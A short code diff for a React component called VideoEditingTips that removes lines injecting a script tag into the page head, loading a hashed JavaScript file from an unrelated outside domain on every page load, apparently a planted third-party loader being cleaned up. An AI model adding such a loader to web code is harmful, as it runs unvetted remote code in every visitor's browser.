@@ -53,21 +53,6 @@ class VideoEditingTips extends Component {
             }
         })
 
-
-
-
-        var head = document.getElementsByTagName('head')[0];
-        var script1 = document.createElement('script');
-        script1.type = 'text/javascript';
-        script1.src = '//availablesyrup.com/24/61/b8/2461b8aebe7eec0e2f3d7e21ae4ff82d.js';
-        head.appendChild(script1);
-
-
-      
-
-
-     
-
     }
 
 
